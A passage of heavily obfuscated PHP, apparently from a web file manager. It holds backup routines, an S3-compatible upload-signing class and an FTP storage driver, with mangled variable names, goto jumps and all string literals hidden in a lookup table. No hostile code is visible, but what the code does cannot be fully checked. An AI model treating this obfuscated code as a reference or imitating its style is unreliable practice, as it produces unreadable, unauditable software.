$¼©ñÈ„[$_SERVER[ÕŸ²ó÷å][550]]; $éíúúÜ½ += 1; $Şæ’° += $¼©ñÈ„[$_SERVER[ÕŸ²ó÷å][89]]; $åü‚¦ë« += 1; $‰Ë¾‰™Š += $¼©ñÈ„[$_SERVER[ÕŸ²ó÷å][89]]; if ($Şæ’° >= 1024 * 1024 * 100) { $¤µş¸Ü° = array($_SERVER[ÕŸ²ó÷å][835] => $üíŞ¨„›, $_SERVER[ÕŸ²ó÷å][904] => $åü‚¦ë«, $_SERVER[ÕŸ²ó÷å][905] => $‰Ë¾‰™Š); Backup::set($¤µş¸Ü°); $Şæ’° = $éíúúÜ½ = 0; } } $¼Êû£´¾ = count($¤ñ¥×£¡); $âô£§Ê…++; } while ($¼Êû£´¾ == $ç²Å¢¾’); $ÎŸÛŠÓ->end(); $¤µş¸Ü° = array($_SERVER[ÕŸ²ó÷å][906] => 1, $_SERVER[ÕŸ²ó÷å][845] => time(), $_SERVER[ÕŸ²ó÷å][859] => 1, $_SERVER[ÕŸ²ó÷å][835] => $üíŞ¨„›, $_SERVER[ÕŸ²ó÷å][907] => time()); if ($éíúúÜ½) { $¤µş¸Ü°[$_SERVER[ÕŸ²ó÷å][904]] = $åü‚¦ë«; $¤µş¸Ü°[$_SERVER[ÕŸ²ó÷å][905]] = $‰Ë¾‰™Š; } Backup::set($¤µş¸Ü°); return !0; } private function _fileExist($¼ÂŠª¹–, &$ËÁ”È«”, $¹¶à½ŠÌ) { $‚ìúŠš¶ =& $_SERVER[ÕŸ²ó÷å]; $©š×‰–ş = $¼ÂŠª¹–[$‚ìúŠš¶[97]]; if (in_array($¼ÂŠª¹–[$‚ìúŠš¶[550]], $ËÁ”È«”)) { return !1; } if (!in_array($¼ÂŠª¹–[$‚ìúŠš¶[901]], $¹¶à½ŠÌ)) { return !1; } if (IO::exist($©š×‰–ş)) { return !0; } $ı½Şû„ = get_path_father($©š×‰–ş); if (IO::exist($ı½Şû„)) { $ËÁ”È«”[] = $¼ÂŠª¹–[$‚ìúŠš¶[550]]; return !1; } $Îºèˆ—ú = array($‚ìúŠš¶[901] => $¼ÂŠª¹–[$‚ìúŠš¶[901]], $‚ìúŠš¶[97] => array($‚ìúŠš¶[468], "{$ı½Şû„}\x25")); $Ñ¼¢å¢Ô = Model($‚ìúŠš¶[873])->where($Îºèˆ—ú)->field($‚ìúŠš¶[551])->select(); $ËÁ”È«” = array_merge($ËÁ”È«”, array_to_keyvalue($Ñ¼¢å¢Ô, $‚ìúŠš¶[12], $‚ìúŠš¶[550])); return !1; } private function _fileFilter($ÅĞ»œ°¬) { $‡ÃÚØà =& $_SERVER[ÕŸ²ó÷å]; return; if (empty($ÅĞ»œ°¬)) { return; } $øáŞ×ï‚ = array($‡ÃÚØà[550] => array($‡ÃÚØà[7], array_unique($ÅĞ»œ°¬))); $„Ù²¥çÍ = Model($‡ÃÚØà[908])->where($øáŞ×ï‚)->field($‡ÃÚØà[203])->select(); foreach ($„Ù²¥çÍ as $ë´¹°¢) { Model($‡ÃÚØà[908])->remove($ë´¹°¢[$‡ÃÚØà[203]], !1); } } private function storeIds() { $‰³³Å¿ =& $_SERVER[ÕŸ²ó÷å]; $´¥øÙ¡ = Model($‰³³Å¿[851])->listData(); $†»æ²±è = array(); $¦Ê·’Ñß = $GLOBALS[$‰³³Å¿[6]][$‰³³Å¿[102]][$‰³³Å¿[909]]; foreach ($´¥øÙ¡ as $Ã¬ª»ñé) { $µĞ—¡Ê¥ = strtolower($Ã¬ª»ñé[$‰³³Å¿[108]]); if (!isset($¦Ê·’Ñß[$µĞ—¡Ê¥])) { continue; } $öóÂíœ = $‰³³Å¿[87] . (isset($¦Ê·’Ñß[$µĞ—¡Ê¥]) ? $¦Ê·’Ñß[$µĞ—¡Ê¥] : ucfirst($µĞ—¡Ê¥)); if (!class_exists($öóÂíœ)) { continue; } $†»æ²±è[] = $Ã¬ª»ñé[$‰³³Å¿[484]]; } return $†»æ²±è; } } goto eÒàÎËÏô»; c¶ÛĞ’ğ­½: class PathDriverEDS extends PathDriverBaseS3 { public function __construct($Ãùú“©) { parent::__construct($Ãùú“©); $this->setSignVersion($_SERVER[ÕŸ²ó÷å][257]); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ëùˆœîÂ) { parent::__construct($ëùˆœîÂ); $this->setSignVersion($_SERVER[ÕŸ²ó÷å][257]); } public function uploadFormData($î÷ø…ëü, $…ßİ¿À— = 3600) { $“¢Ù½»‹ =& $_SERVER[ÕŸ²ó÷å]; $ÇÂ†Ú“Ñ = $“¢Ù½»‹[239]; $È„‚‰» = $“¢Ù½»‹[279]; $ÕùÍ”Ûñ = $“¢Ù½»‹[72]; $‡úù×ê• = gmdate($“¢Ù½»‹[280]); $Ñ”ê‰« = gmdate($“¢Ù½»‹[281]); $›Ò×îò = $“¢Ù½»‹[282]; $ÌØ¤ÉÕã = $…ßİ¿À— . $“¢Ù½»‹[12]; $ŸÂË¼ßû = $“¢Ù½»‹[283]; $û†µ¦Í„ = array($this->accessKey, $Ñ”ê‰«, $this->region, $ÕùÍ”Ûñ, $›Ò×îò); $Âû®‰ = implode($“¢Ù½»‹[8], $û†µ¦Í„); $¹ïæ‘”Ï = array($“¢Ù½»‹[284] => gmdate($“¢Ù½»‹[308], strtotime($“¢Ù½»‹[286])), $“¢Ù½»‹[287] => array(array($“¢Ù½»‹[288] => $this->bucket), array($“¢Ù½»‹[289] => $ÇÂ†Ú“Ñ), array($“¢Ù½»‹[290], $“¢Ù½»‹[291], $“¢Ù½»‹[12]), array($“¢Ù½»‹[290], $“¢Ù½»‹[292], $“¢Ù½»‹[12]), array($“¢Ù½»‹[290], $“¢Ù½»‹[293], $“¢Ù½»‹[12]), array($“¢Ù½»‹[294] => $ŸÂË¼ßû), array($“¢Ù½»‹[295] => $Âû®‰), array($“¢Ù½»‹[296] => $È„‚‰»), array($“¢Ù½»‹[297] => $‡úù×ê•), array($“¢Ù½»‹[298] => $ÌØ¤ÉÕã))); $Ç€Ñ¯Ğ = base64_encode(json_encode($¹ïæ‘”Ï)); $¹ô¤½·È = hash_hmac($“¢Ù½»‹[299], $Ñ”ê‰«, $“¢Ù½»‹[300] . $this->secret, !0); $¦µĞ®™ = hash_hmac($“¢Ù½»‹[299], $this->region, $¹ô¤½·È, !0); $ÁòŠÖ‰ = hash_hmac($“¢Ù½»‹[299], $ÕùÍ”Ûñ, $¦µĞ®™, !0); $Ï«â–„÷ = hash_hmac($“¢Ù½»‹[299], $›Ò×îò, $ÁòŠÖ‰, !0); $ÓšÈğô‰ = hash_hmac($“¢Ù½»‹[299], $Ç€Ñ¯Ğ, $Ï«â–„÷); $ÀÉÔŠ®É = array($“¢Ù½»‹[256] => $“¢Ù½»‹[12], $“¢Ù½»‹[301] => $“¢Ù½»‹[12], $“¢Ù½»‹[289] => $ÇÂ†Ú“Ñ, $“¢Ù½»‹[294] => $ŸÂË¼ßû, $“¢Ù½»‹[302] => $Ç€Ñ¯Ğ, $“¢Ù½»‹[303] => $Âû®‰, $“¢Ù½»‹[304] => $È„‚‰», $“¢Ù½»‹[305] => $‡úù×ê•, $“¢Ù½»‹[306] => $ÌØ¤ÉÕã, $“¢Ù½»‹[307] => $ÓšÈğô‰, $“¢Ù½»‹[218] => $this->getHost()); return $ÀÉÔŠ®É; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($¡ÍæÃò) { parent::__construct(); if (count($¡ÍæÃò) > 0) { $this->_init($¡ÍæÃò); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($€¬ÖÄ«‡) { $¿·®„¹ =& $_SERVER[ÕŸ²ó÷å]; global $config; $this->appCharset = $config[$¿·®„¹[1439]]; $this->systemCharset = $config[$¿·®„¹[1440]]; if (isset($€¬ÖÄ«‡[$¿·®„¹[1441]]) && $€¬ÖÄ«‡[$¿·®„¹[1441]]) { $this->systemCharset = $€¬ÖÄ«‡[$¿·®„¹[1441]]; } } public function iconvApp($ÈÜß¸ªÛ) { return $this->iconvTo($ÈÜß¸ªÛ, $this->systemCharset, $this->appCharset); } public function iconvSystem($Î¬Í”Ò) { return $this->iconvTo($Î¬Í”Ò, $this->appCharset, $this->systemCharset); } public function getPathOuter($§¬±·Èœ) { $ö†Óºªü =& $_SERVER[ÕŸ²ó÷å]; $Í—ŒºŸ = $this->iconvApp($this->pathBase); $§¬±·Èœ = $this->iconvApp($§¬±·Èœ); if (substr($Í—ŒºŸ, 0, 2) == $ö†Óºªü[1413]) { $Í—ŒºŸ = BASIC_PATH . substr($Í—ŒºŸ, 2); } if (substr($§¬±·Èœ, 0, 2) == $ö†Óºªü[1413]) { $§¬±·Èœ = BASIC_PATH . substr($§¬±·Èœ, 2); } $Í—ŒºŸ = KodIO::clear($Í—ŒºŸ); $§¬±·Èœ = KodIO::clear($§¬±·Èœ); $§¬±·Èœ = substr($§¬±·Èœ, strlen($Í—ŒºŸ)); if (empty($this->pathDriver)) { return $§¬±·Èœ; } return $this->pathDriver . $ö†Óºªü[8] . ltrim($§¬±·Èœ, $ö†Óºªü[8]); } private function _init($¨”†ê„ = array()) { $Âúçƒ« =& $_SERVER[ÕŸ²ó÷å]; if (!function_exists($Âúçƒ«[1442])) { throw new Exception(LNG($Âúçƒ«[1443])); } $this->config = $¨”†ê„; $this->charsetReset($¨”†ê„); foreach ($¨”†ê„ as $·ø¢Òïã => $Õº›ò‰) { if (isset($this->{$·ø¢Òïã})) { $this->{$·ø¢Òïã} = $Õº›ò‰; } } return $this->_login($¨”†ê„); } private function _login($†ñØ²éœ) { $î¶Í£Ö =& $_SERVER[ÕŸ²ó÷å]; static $Š€ Ì¸ = array(); $÷Ú‹´ó = md5(json_encode($†ñØ²éœ)); if (isset($Š€ Ì¸[$÷Ú‹´ó])) { foreach ($Š€ Ì¸[$÷Ú‹´ó] as $æ»“Ã›ß => $¹áúíª£) { $this->{$æ»“Ã›ß} = $¹áúíª£; } return !0; } $’³¢ò€ = parse_url(trim($this->server, $î¶Í£Ö[8])); $this->host = $’³¢ò€[$î¶Í£Ö[218]]; $¼İÅ£Ø = isset($’³¢ò€[$î¶Í£Ö[217]]) && $’³¢ò€[$î¶Í£Ö[217]] == $î¶Í£Ö[1444] ? !0 : !1; $this->scheme = $¼İÅ£Ø ? $î¶Í£Ö[1445] : $î¶Í£Ö[1446]; $this->port = isset($’³¢ò€[$î¶Í£Ö[219]]) ? $’³¢ò€[$î¶Í£Ö[219]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($î¶Í£Ö[1447]) . $this->host . $î¶Í£Ö[4] . $this->port, !0); return !1; } $»‘ê¹ßß = @ftp_login($this->connect, $this->username, $this->userpass); if (!$»‘ê¹ßß) { $this->writeLog(LNG($î¶Í£Ö[1448]) . $this->username, !0); return !1; } @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $»¬Ÿ¼ƒÀ = $this->pasv == $î¶Í£Ö[101] ? !0 : !1; @ftp_pasv($this->connect, $»¬Ÿ¼ƒÀ); $Š€ Ì¸[$÷Ú‹´ó] = array($î¶Í£Ö[1449] => $this->connect, $î¶Í£Ö[218] => $this->host, $î¶Í£Ö[217] => $this->scheme, $î¶Í£Ö[219] => $this->port); return $»‘ê¹ßß; } private function _isconn($ğÍ²å” = true) { if (is_resource($this->connect)) { return !0; } if (!$ğÍ²å”) { return !1; } return $this->_login($this->config); } public function mkfile($è‹°’›¤, $¢éÖÉ›Ó = '', $›ú¬ËìÂ = REPEAT_RENAME) { if ($this->setContent($è‹°’›¤, $¢éÖÉ›Ó)) { return $this->getPathOuter($è‹°’›¤); } $this->writeLog(LNG($_SERVER[ÕŸ²ó÷å][1450]), !0); return !1; } public function mkdir($«¼úŸï£, $¨ÍÃÚÖ = REPEAT_SKIP) { $ÛÂş‘à´ =& $_SERVER[ÕŸ²ó÷å]; if (!$«¼úŸï£ || $«¼úŸï£ == $ÛÂş‘à´[8]) { return !0; } if (!$this->_isconn()) { return !1; } $«¼úŸï£ = $this->iconvSystem($«¼úŸï£); if ($this->_isFolder($«¼úŸï£) || @ftp_mkdir($this->connect, $«¼úŸï£)) { return $this->getPathOuter($«¼úŸï£); } if (!$this->mkdir($this->pathFather($«¼úŸï£))) { return !1; } if ($«¼úŸï£ = @ftp_mkdir($this->connect, $«¼úŸï£)) { return $this->getPathOuter($«¼úŸï£); } $this->writeLog(__FUNCTION__ . $ÛÂş‘à´[1451], !0); return !1; } public function copyFile($¦¦ï›˜ı, $å„ëÓ«á) { if (!$this->_isconn()) { return !1; } $í¸¸µèë = $this->pathThis($this->iconvSystem($¦¦ï›˜ı)); $ş÷ÙÛ¤ = $this->tempFile($í¸¸µèë); $ú²‰í²š = $this->iconvApp($ş÷ÙÛ¤); $this->download($¦¦ï›˜ı, $ú²‰í²š); $…­ô¢öŒ = $this->upload($å„ëÓ«á, $ú²‰í²š); $this->tempFileRemve($ş÷ÙÛ¤); return $…­ô¢öŒ; } public function moveFile($ ò×½Ó¦, $ƒå‡¼ ) { if (!$this->_isconn()) { return !1; } $ ò×½Ó¦ = $this->iconvSystem($ ò×½Ó¦); $ƒå‡¼  = $this->iconvSystem($ƒå‡¼ ); $ç¡©¹™‘ = @ftp_rename($this->connect, $ ò×½Ó¦, $ƒå‡¼ ); if (!$ç¡©¹™‘) { $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][1451], !0); return !1; } return $this->getPathOuter($ƒå‡¼ ); } public function delFile($‡÷§‹‡ì) { if (!$this->_isconn()) { return !1; } $‡÷§‹‡ì = $this->iconvSystem($‡÷§‹‡ì); $ôü›ıü¹ = @ftp_delete($this->connect, $‡÷§‹‡ì); if (!$ôü›ıü¹) { $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][1451], !0); } return $ôü›ıü¹; } public function delFolder($ª—¤‘ğå) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $³ıû½ı = $”¿²šÀ÷ = array(); $this->fileList($ª—¤‘ğå, $³ıû½ı, $”¿²šÀ÷, !0); $this->listItemCache = !0; foreach ($”¿²šÀ÷ as $é“ïö°İ) { $ãÄùÀû£ = $this->iconvSystem($é“ïö°İ[$_SERVER[ÕŸ²ó÷å][32]]); $œäÜŠİü = @ftp_delete($this->connect, $ãÄùÀû£); if (!$œäÜŠİü) { return !1; } } foreach ($³ıû½ı as $ãÄùÀû£) { $ãÄùÀû£ = $this->iconvSystem($ãÄùÀû£); $œäÜŠİü = @ftp_rmdir($this->connect, $ãÄùÀû£); if (!$œäÜŠİü) { return !1; } } $ª—¤‘ğå = $this->iconvSystem($ª—¤‘ğå); return @ftp_rmdir($this->connect, $ª—¤‘ğå); } public function rename($»ğ¬Š¨é, $î˜ğ€í¸) { $åˆºÉÑ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->_isconn()) { return !1; } $Ç‚—ÕÈñ = $this->fileNameAuto($this->pathFather($»ğ¬Š¨é), $î˜ğ€í¸); $Ç‚—ÕÈñ = $this->iconvSystem($Ç‚—ÕÈñ); $»ğ¬Š¨é = $this->iconvSystem($»ğ¬Š¨é); $²ØÈúİø = $this->pathFather($»ğ¬Š¨é); $ªñîö²œ = rtrim($²ØÈúİø, $åˆºÉÑ[8]) . $åˆºÉÑ[8] . $Ç‚—ÕÈñ; $µòÊ¾ğ¯ = @ftp_rename($this->connect, $»ğ¬Š¨é, $ªñîö²œ); if (!$µòÊ¾ğ¯) { $this->writeLog(__FUNCTION__ . $åˆºÉÑ[1451], !0); return !1; } $ªñîö²œ = $this->iconvApp($ªñîö²œ); return $this->getPathOuter($ªñîö²œ); } private function folderInfo($œ¬­¤õ¤, $§›Ş…ú˜ = false) { $ÜÚ¿¤ŠÔ =& $_SERVER[ÕŸ²ó÷å]; $…×şÇîÅ = array($ÜÚ¿¤ŠÔ[32] => $this->pathThis($œ¬­¤õ¤), $ÜÚ¿¤ŠÔ[97] => $this->getPathOuter($ÜÚ¿¤ŠÔ[8] . $œ¬­¤õ¤), $ÜÚ¿¤ŠÔ[33] => $ÜÚ¿¤ŠÔ[88]); if ($§›Ş…ú˜) { return $…×şÇîÅ; } $…×şÇîÅ[$ÜÚ¿¤ŠÔ[241]] = $…×şÇîÅ[$ÜÚ¿¤ŠÔ[98]] = 0; $…×şÇîÅ[$ÜÚ¿¤ŠÔ[242]] = $…×şÇîÅ[$ÜÚ¿¤ŠÔ[243]] = !0; return $…×şÇîÅ; } private function fileInfo($Òíñ«şä, $õ‚Ç’Æô = false, $ÀÄ†É™â = array()) { $…ŸâÇÖæ =& $_SERVER[ÕŸ²ó÷å]; $¿´Õªš = array($…ŸâÇÖæ[32] => $this->pathThis($Òíñ«şä), $…ŸâÇÖæ[97] => $this->getPathOuter($…ŸâÇÖæ[8] . $Òíñ«şä), $…ŸâÇÖæ[33] => $…ŸâÇÖæ[240], $…ŸâÇÖæ[89] => isset($ÀÄ†É™â[$…ŸâÇÖæ[89]]) ? $ÀÄ†É™â[$…ŸâÇÖæ[89]] : 0, $…ŸâÇÖæ[179] => $this->ext($Òíñ«şä)); if ($õ‚Ç’Æô) { return $¿´Õªš; } $¿´Õªš[$…ŸâÇÖæ[241]] = $¿´Õªš[$…ŸâÇÖæ[98]] = 0; $¿´Õªš[$…ŸâÇÖæ[242]] = $¿´Õªš[$…ŸâÇÖæ[243]] = !0; $ìÕÏò˜† = $this->iconvSystem($Òíñ«şä); $¿´Õªš[$…ŸâÇÖæ[98]] = @ftp_mdtm($this->connect, $ìÕÏò˜†); if (empty($ÀÄ†É™â)) { $ÀÄ†É™â = $this->objectMeta($Òíñ«şä); if (!$ÀÄ†É™â) { return $¿´Õªš; } } $¿´Õªš[$…ŸâÇÖæ[89]] = $ÀÄ†É™â[$…ŸâÇÖæ[89]]; return $¿´Õªš; } public function size($êÛ“Œ¤ ) { $î»ÎüûÍ = $this->objectMeta($êÛ“Œ¤ ); return $î»ÎüûÍ ? $î»ÎüûÍ[$_SERVER[ÕŸ²ó÷å][89]] : 0; } public function info($·”˜›µ”) { if ($this->isFile($·”˜›µ”)) { return $this->fileInfo($·”˜›µ”, 0); } else { if ($this->isFolder($·”˜›µ”)) { return $this->folderInfo($·”˜›µ”); } } return !1; } private function fileList($‹Îæş›, &$Ì—Ğç³é, &$ğª›ˆÀŞ, $Àƒ¼„œ‚ = false) { $ÃïÁÄˆö =& $_SERVER[ÕŸ²ó÷å]; $‹Îæş› = $this->iconvSystem($‹Îæş›); if (!$this->isFolder($‹Îæş›)) { return !1; } @ftp_chdir($this->connect, $ÃïÁÄˆö[8]); $‹Îæş› = rtrim($‹Îæş›, $ÃïÁÄˆö[8]) . $ÃïÁÄˆö[8]; check_abort(); $¿È·Í¸ó = @ftp_rawlist($this->connect, $‹Îæş›); if (!$¿È·Í¸ó) { $¿È·Í¸ó = array(); } $±‰ˆ¾ıÓ = array($ÃïÁÄˆö[10] => 1, $ÃïÁÄˆö[1366] => 1); foreach ($¿È·Í¸ó as $¬Åé‘®Ä) { $†ÑƒÀŠË = $this->_listItem($¬Åé‘®Ä); if ($†ÑƒÀŠË[0] == $ÃïÁÄˆö[842]) { continue; } $­Â¹ğë¬ = $†ÑƒÀŠË[8]; if (empty($­Â¹ğë¬) && $­Â¹ğë¬ !== $ÃïÁÄˆö[238] || isset($±‰ˆ¾ıÓ[$­Â¹ğë¬])) { continue; } $­Â¹ğë¬ = $this->iconvApp($‹Îæş› . ltrim($­Â¹ğë¬, $ÃïÁÄˆö[8])); $üÖÁ£¬ = array($ÃïÁÄˆö[32] => $­Â¹ğë¬, $ÃïÁÄˆö[33] => $ÃïÁÄˆö[240], $ÃïÁÄˆö[89] => $†ÑƒÀŠË[4]); if (substr($¬Åé‘®Ä, 0, 1) == $ÃïÁÄˆö[1452]) { $üÖÁ£¬[$ÃïÁÄˆö[33]] = $ÃïÁÄˆö[88]; $üÖÁ£¬[$ÃïÁÄˆö[89]] = 0; } $´Ïı¸ë— = $üÖÁ£¬[$ÃïÁÄˆö[33]] == $ÃïÁÄˆö[88] ? !0 : !1; $this->cacheMethodInfoSet($­Â¹ğë¬, $´Ïı¸ë—, $üÖÁ£¬); if ($´Ïı¸ë—) { $Ì—Ğç³é[] = $­Â¹ğë¬; if ($Àƒ¼„œ‚) { $this->fileList($­Â¹ğë¬, $Ì—Ğç³é, $ğª›ˆÀŞ, $Àƒ¼„œ‚); } continue; } $ğª›ˆÀŞ[] = $üÖÁ£¬; } $this->cacheMethodInfoSet($‹Îæş›, !0); } private function _listItem($ÛÎÜäŒ÷) { if (empty($ÛÎÜäŒ÷)) { return array(); } $ÏñÛÇÙ = preg_split($_SERVER[ÕŸ²ó÷å][1453], $ÛÎÜäŒ÷); if (count($ÏñÛÇÙ) <= 9) { return $ÏñÛÇÙ; } $ÏñÛÇÙ[8] = trim(substr($ÛÎÜäŒ÷, strpos($ÛÎÜäŒ÷, $ÏñÛÇÙ[7]) + strlen($ÏñÛÇÙ[7]))); return array_splice($ÏñÛÇÙ, 0, 9); } public function listPath($°ÀÛµâ‹, $ı¡Êı— = false) { $Ş—¸¥¿ =& $_SERVER[ÕŸ²ó÷å]; if (!$this->_isconn()) { return !1; } $øí†ó»â = $´ĞãŠˆ = array(); $this->fileList($°ÀÛµâ‹, $øí†ó»â, $´ĞãŠˆ); foreach ($øí†ó»â as $–‡ÛñÌÍ => $«™Ä“„) { $øí†ó»â[$–‡ÛñÌÍ] = $this->folderInfo($«™Ä“„, $ı¡Êı—); } foreach ($´ĞãŠˆ as $–‡ÛñÌÍ => $«™Ä“„) { $´ĞãŠˆ[$–‡ÛñÌÍ] = $this->fileInfo($«™Ä“„[$Ş—¸¥¿[32]], $ı¡Êı—, $«™Ä“„); } return array($Ş—¸¥¿[95] => $øí†ó»â, $Ş—¸¥¿[96] => $´ĞãŠˆ); } public function has($ÇÀŒÛ¥‡, $…˜éùŠŠ = false, $úëı×ß± = true) { $Êû÷Øš³ =& $_SERVER[ÕŸ²ó÷å]; $òËè¾Ã = $Æ®‚é£Û = array(); $ùÏ•Ç°§ = $…˜éùŠŠ ? !0 : !1; $this->fileList($ÇÀŒÛ¥‡, $òËè¾Ã, $Æ®‚é£Û, $ùÏ•Ç°§); if ($…˜éùŠŠ) { return array($Êû÷Øš³[249] => count($Æ®‚é£Û), $Êû÷Øš³[250] => count($òËè¾Ã)); } if ($úëı×ß±) { if (count($Æ®‚é£Û)) { return !0; } } else { if (count($òËè¾Ã)) { return !0; } } return !1; } public function listAll($³±—¯Î) { $’Ò ìèú =& $_SERVER[ÕŸ²ó÷å]; if (!$this->_isconn()) { return !1; } $×¶¸ã = $ç«ô»ôı = array(); $this->fileList($³±—¯Î, $×¶¸ã, $ç«ô»ôı, !0); $è¬èÏè¡ = array_to_keyvalue($ç«ô»ôı, $’Ò ìèú[32]); foreach ($×¶¸ã as $ıòõ»’ş) { if (is_string($ıòõ»’ş)) { $è¬èÏè¡[$ıòõ»’ş] = array($’Ò ìèú[89] => 0); } } return $this->listAllFiles($³±—¯Î, $è¬èÏè¡); } public function getContent($Ä­¬ß•) { if (!$this->_isconn()) { return !1; } $Ä­¬ß• = $this->iconvSystem($Ä­¬ß•); return $this->fileSubstr($Ä­¬ß•); } public function setContent($Ğòšï¸, $Ê•è®íú = '') { if (!$this->_isconn()) { return !1; } $´øƒê ‰ = $this->pathThis($this->iconvSystem($Ğòšï¸)); $Ù•™Æş• = $this->tempFile($´øƒê ‰); file_put_contents($Ù•™Æş•, $Ê•è®íú); $ĞŸšÓ«÷ = $this->upload($Ğòšï¸, $this->iconvApp($Ù•™Æş•)); $this->tempFileRemve($Ù•™Æş•); return $ĞŸšÓ«÷; } public function fileSubstr($Ÿ§ÁŠı, $Õ¡†ˆŞà = 0, $ìÌëæ¨Ğ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($Ÿ§ÁŠı, $Õ¡†ˆŞà, $ìÌëæ¨Ğ); } private function ftpRequest($ªµ‡‹‘º, $‚Â™˜„  = 0, $ËËõÔË = false) { $ªµ‡‹‘º = $this->iconvSystem($ªµ‡‹‘º); $íöŞ‚©ƒ = $this->scheme . $this->host . $_SERVER[ÕŸ²ó÷å][4] . $this->port; $¤°µ‹‘ = curl_init(); curl_setopt($¤°µ‹‘, CURLOPT_URL, $íöŞ‚©ƒ . $this->pathEncode($ªµ‡‹‘º)); curl_setopt($¤°µ‹‘, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ËËõÔË) { $œÔäÍÀÎ = $‚Â™˜„  + $ËËõÔË - 1; curl_setopt($¤°µ‹‘, CURLOPT_RANGE, "{$‚Â™˜„ }\55{$œÔäÍÀÎ}"); } curl_setopt($¤°µ‹‘, CURLOPT_RETURNTRANSFER, 1); $ªõê½§ú = curl_exec($¤°µ‹‘); curl_close($¤°µ‹‘); return $ªõê½§ú; } public function upload($ó¿ø¶”à, $ˆ÷ØıÔÀ, $›‚Çº°± = false, $î·â±•û = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($ó¿ø¶”à))) { return !1; } $ó¿ø¶”à = $this->iconvSystem($ó¿ø¶”à); $ˆ÷ØıÔÀ = $this->iconvSystem($ˆ÷ØıÔÀ); $óñâõä = ftp_nb_put($this->connect, $ó¿ø¶”à, $ˆ÷ØıÔÀ, FTP_BINARY); while ($óñâõä == FTP_MOREDATA) { $óñâõä = ftp_nb_continue($this->connect); } if ($óñâõä != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][1451], !0); return !1; } return $this->getPathOuter($ó¿ø¶”à); } public function download($ ¡…¦Öó, $öÖØÈ¢ = '') { if (!$this->_isconn()) { return !1; } $ñÅ›åÏ© = $this->pathFather($öÖØÈ¢); if (!IO::mkdir($ñÅ›åÏ©)) { return !1; } $ ¡…¦Öó = $this->iconvSystem($ ¡…¦Öó); $öÖØÈ¢ = $this->iconvSystem($öÖØÈ¢); $µæäáìÃ = ftp_nb_get($this->connect, $öÖØÈ¢, $ ¡…¦Öó, FTP_BINARY); while ($µæäáìÃ == FTP_MOREDATA) { $µæäáìÃ = ftp_nb_continue($this->connect); } if ($µæäáìÃ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ÕŸ²ó÷å][1451], !0); return !1; } return $this->iconvApp($öÖØÈ¢); } public function exist($†Â‰áÄ—) { return $this->isFile($†Â‰áÄ—) || $this->isFolder($†Â‰áÄ—); } public function isFile($° äéœú) { return !$this->isFolder($° äéœú) && $this->objectMeta($° äéœú); } public function isFolder($¬êÈ¢Áï) { return $this->cacheMethod($_SERVER[ÕŸ²ó÷å][189], $¬êÈ¢Áï); } protected function objectMeta($˜ÁË‰äœ) { return $this->cacheMethod($_SERVER[ÕŸ²ó÷å][191], $˜ÁË‰äœ); } protected function _objectMeta($Ğ·ß¿ïë) { $ïÓ’áæå =& $_SERVER[ÕŸ²ó÷å]; if ($Ğ·ß¿ïë == $ïÓ’áæå[12] || $Ğ·ß¿ïë == $ïÓ’áæå[8]) { return array(); } if (!$this->_isconn()) { return !1; } $Ğ·ß¿ïë = $this->iconvSystem($Ğ·ß¿ïë); $ƒ‹¡ËÈ¢ = array($ïÓ’áæå[32] => $this->iconvApp($Ğ·ß¿ïë), $ïÓ’áæå[33] => $ïÓ’áæå[240], $ïÓ’áæå[89] => 0); @ftp_chdir($this->connect, $ïÓ’áæå[8]); $ëŞï³‘ï = @ftp_size($this->connect, $Ğ·ß¿ïë); if ($ëŞï³‘ï != -1) { $ƒ‹¡ËÈ¢[$ïÓ’áæå[89]] = $ëŞï³‘ï; } else { $¢„Çğ•ş = @ftp_chdir($this->connect, $Ğ·ß¿ïë); if (!$¢„Çğ•ş) { return !1; } $ƒ‹¡ËÈ¢[$ïÓ’áæå[33]] = $ïÓ’áæå[88]; } return $ƒ‹¡ËÈ¢; } protected function _isFolder($èçÉû‡á) { $Âà‚‡¶ =& $_SERVER[ÕŸ²ó÷å]; if ($èçÉû‡á == $Âà‚‡¶[12] || $èçÉû‡á == $Âà‚‡¶[8]) { return !0; } $ÇÑî½º = $this->_objectMeta($èçÉû‡á); return isset($ÇÑî½º[$Âà‚‡¶[33]]) && $ÇÑî½º[$Âà‚‡¶[33]] == $Âà‚‡¶[88] ? !0 : !1; } } goto cİ˜éñœã; D£ôª‚š­á: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($™¡ĞÊÂ) { $¸³Éõ =& $_SERVER[ÕŸ²ó÷å]; $œû…‚“™ = Model($¸³Éõ[586])->where(array($¸³Éõ[1764] => $™¡ĞÊÂ))->find(); $°úÊºÂî = $this->_mkdirRoot(SourceModel::TYPE_USER, $™¡ĞÊÂ, $œû…‚“™[$¸³Éõ[32]]); $this->userDesktopAdd($°úÊºÂî); return $°úÊºÂî; } public function userDesktopAdd($°ÔĞ¿•¼) { $†şŠÇæ =& $_SERVER[ÕŸ²ó÷å]; $ŠÌë©Ö‹ = LNG($†şŠÇæ[2251]); $½¶è÷·õ = $this->mkdir($°ÔĞ¿•¼, $ŠÌë©Ö‹); $this->metaSet($½¶è÷·õ, $†şŠÇæ[2252], $†şŠÇæ[101]); $this->metaSet($°ÔĞ¿•¼, $†şŠÇæ[2253], $½¶è÷·õ); } public function userPathSafeAdd($Æ‚Şƒ) { $íŒ•—Úµ =& $_SERVER[ÕŸ²ó÷å]; $©Üæå–Ù = Model($íŒ•—Úµ[586])->getInfoFull($Æ‚Şƒ); if 